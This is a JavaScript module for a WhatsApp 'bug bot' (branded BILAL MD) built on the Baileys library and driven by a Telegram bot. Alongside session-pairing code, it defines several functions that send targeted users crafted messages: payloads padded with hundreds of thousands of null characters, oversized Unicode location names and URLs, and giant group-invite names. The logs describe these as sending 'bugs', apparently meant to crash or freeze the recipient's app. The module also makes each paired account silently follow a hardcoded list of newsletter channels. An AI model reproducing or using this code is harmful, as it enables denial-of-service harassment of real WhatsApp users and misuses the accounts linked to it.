const fs = require('fs');
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header,
	encodeSignedDeviceIdentity,
	jidEncode,
	jidDecode,
	encodeWAMessage,
	patchMessageBeforeSending,
	encodeNewsletterMessage,
    getUSyncDevices,
	default: makeWaSocket,
	makeWASocket,
	useMultiFileAuthState
} = require("baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const sessions = new Map();
const sessions_dir = "./sessions";
const file_session = "./active.json";

//=================================================//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let client;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const removeActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  let list = JSON.parse(fs.readFileSync(file_session));
  list = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(list));
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const id = [
  "120363319314627296@newsletter",
  "120363396481563238@newsletter",
  "120363304365886636@newsletter",
  "120363385008721204@newsletter",
  "120363395342918977@newsletter",
  "120363311908114870@newsletter",
  "120363386940140083@newsletter",
  "120363419213340754@newsletter",
  "120363421116382525@newsletter",
  "120363402313622138@newsletter",
  "120363390667657837@newsletter",
  "120363386439146772@newsletter",
  "120363313155064138@newsletter"
];
const initializeWhatsAppConnections = async (chatId, ctx) => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

  for (const BotNumber of activeNumbers) {
    console.log(`Menghubungkan WhatsApp: ${BotNumber}`);
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    client = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      client.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, client);
          for (const newsletterId of id) {
    await client.newsletterFollow(newsletterId);
}
          ctx.reply(`✅ WhatsApp Connected Successfully
Now you can use features that require a WhatsApp session
Bot Number: ${BotNumber}`, { parse_mode: "Markdown" });
          return resolve();
        }
        if (connection === "close") {
          console.log(chalk.red(`🚫 Bot ${BotNumber} have logged out of WhatsApp!`));
          sessions.delete(BotNumber);
          removeActive(BotNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
          await ctx.reply(`🚫 WhatsApp Session Deleted
Your WhatsApp session has been logged out or blocked and has been deleted. Please connect again your session using /reqpair.`, { parse_mode: "Markdown" });
          return resolve();
        }
      });
      client.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  client = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  client.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, `♻️ WhatsApp Reconnecting in Progress
We're trying to re-establish your WhatsApp session. Please wait a moment...`));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }
      
      sessions.delete(BotNumber);
      removeActive(BotNumber);
      fs.rmSync(sessionDir, { recursive: true, force: true });
      
      await editStatus(makeStatus(BotNumber, `🚫 WhatsApp Session Deleted
Your WhatsApp session has been logged out or blocked and has been deleted. Please connect again your session using /reqpair.`));
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, client);
      saveActive(BotNumber);
      await client.newsletterFollow(id);;
      return await editStatus(makeStatus(BotNumber, `✅ WhatsApp Connected Successfully
Now you can use features that require a WhatsApp session.`));
for (const newsletterId of id) {
    await client.newsletterFollow(newsletterId);
}
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await client.requestPairingCode(BotNumber, "RIZXVELZ");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "HTML",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  client.ev.on("creds.update", saveCreds);
  return client;
};

const makeStatus = (number, status) => `${status}`;

const makeCode = (number, code) => ({
    text: `<b>— 🟢 WhatsApp Pairing Session</b>

<b>▢ Number :</b> ${number}
<b>▢ Pairing Code :</b> <code>${code}</code>

‼️ Silakan masukkan kode ini di aplikasi WhatsApp Anda untuk menyelesaikan proses penautan perangkat.
<blockquote><b>— ▢ Tata Cara Menautkan Perangkat (Kode Pairing)</b>
1. Buka aplikasi WhatsApp di ponsel Anda.
2. Masuk ke menu:
   • Android: ketuk ikon ⋮ → Perangkat Tertaut
   • iPhone: Settings → Linked Devices
3. Ketuk "Tautkan Perangkat".
4. Pilih "Masukkan Kode" (Enter Code).
5. Masukkan kode pairing: <code>${code}</code>.
6. Tunggu proses verifikasi selesai.
7. Perangkat berhasil ditautkan dan siap digunakan.</blockquote>`
});
//=================================================//

//=================================================//
async function galaxy(isTarget) {
  await client.relayMessage("status@broadcast", {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: { 
            text: "🩸⃟⃨〫⃰‣ ⁖BILAL MD TEAM",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "BILAL MD OFFICIAL",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(522500)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: true,
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "༑ Fail Beta - ( Bilal md bug bot ) \"👋\"",
              newsletterJid: "120363296818107681@newsletter",
              serverMessageId: 1
            },
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "©️ running since 2026 to 20##?",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: 'address_message',
                  paramsJson: "\u0000".repeat(522500),
                  version: 3
                }
              }
            }
          }
        }
      }
    }
  }, {
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: isTarget }, content: [] }]
      }]
    }]
  });

  console.log(chalk.green("─────「 ⏤ Galaxy-Super Ex3cute 」─────"));
}

//=================================================//
async function TrashLocIOS(isTarget) {
    const slash = { url: "" };
    let locationMessage = {
        degreesLatitude: -9.09999262999,
        degreesLongitude: 199.99963118999,
        jpegThumbnail: slash,
        name: "🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖BILAL MD TEAM— ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
        url: `https://rizxvelz-ex3sh.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿"
    };
    
    let msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                locationMessage,
                contextInfo: {
                    remoteJid: "status@broadcast",
                    participant: "0@s.whatsapp.net",
                    fromMe: true,
                    isForwarded: true,
                    forwardingScore: 999,
                    forwardedNewsletterMessageInfo: {
                      newsletterName: "༑ Fail Beta - ( BILAL_MD ) \"👋\"",
                      newsletterJid: "120363296818107681@newsletter",
                      serverMessageId: 1
                    },
                    quotedMessage: {
                      interactiveResponseMessage: {
                        body: {
                          text: "©️ running since 2026 to 20##?",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: 'address_message',
                          paramsJson: "\u0000".repeat(100000),
                          version: 3
                        }
                      }
                    }
                }
            }
        }
    }, {});
    
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
            }]
        }]
    });
    console.log(chalk.green("Success Send Bug By BILAL_MD🐉"));
}

async function galaxyV2(isTarget) {
    const msg = await generateWAMessageFromContent(isTarget,{
        interactiveResponseMessage: {
          contextInfo: {},
          body: {
            text: "🩸⃟⃨〫⃰‣ ⁖BILAL MD TEAM",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          }
        }
      },
      {}
    );
    await client.relayMessage(isTarget, { groupStatusMessageV2: { message: msg.message } }, {});
}
async function InViteAdminA(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
      groupName: "ཹ".repeat(130000),
      groupJid: '120363405376626391@g.us',
      inviteCode: 'BwWffeDwiqe6cjDDklYJ5m',
      inviteExpiration: '999',
      caption: `🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖BILAL MD TEAM ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
      thumbnail: null
    }
  };
  
  await client.relayMessage(IsTarget, msg, 
  ptcp ? { participant: { jid: IsTarget } } : {}
  );
}
async function InViteAdminI(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
      groupName: "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
      groupJid: '120363405376626391@g.us',
      inviteCode: 'BwWffeDwiqe6cjDDklYJ5m',
      inviteExpiration: '999',
      caption: `🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖BILAL MD TEAM ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
      thumbnail: null
    }
  };
  
  await client.relayMessage(IsTarget, msg, 
  ptcp ? { participant: { jid: IsTarget } } : {}
  );
}
async function joinGroup(groupLink) {
    if (!groupLink) throw new Error("Masukkan Link Group!");
    if (!groupLink.includes('https://chat.whatsapp.com/')) throw new Error("Link Invalid!");
    
    const inviteCode = groupLink.split('https://chat.whatsapp.com/')[1];
    
    try {
        const result = await client.groupAcceptInvite(inviteCode);
        return result;
    } catch (error) {
        const ignoredErrors = [409, 410, 'already', 'gone'];
        const shouldIgnore = ignoredErrors.some(err => 
            error.data === err || error.message?.toLowerCase().includes(err)
        );
        
        if (shouldIgnore) {
            console.log(`⚠️ ${error.message} - Continuing anyway...`);
            try {
                const metadata = await client.groupGetInviteInfo(inviteCode);
                return metadata.id;
            } catch {
                return `${inviteCode}@g.us`;
            }
        }
        
        throw error;
    }
}
//=================================================//
module.exports = {
    initializeWhatsAppConnections,
    connectToWhatsApp,
    makeStatus,
    makeCode,
    sessions,
    client,
    galaxy,
    TrashLocIOS,
    galaxyV2,
    InViteAdminA,
    InViteAdminI,
    joinGroup,
    file_session
    };
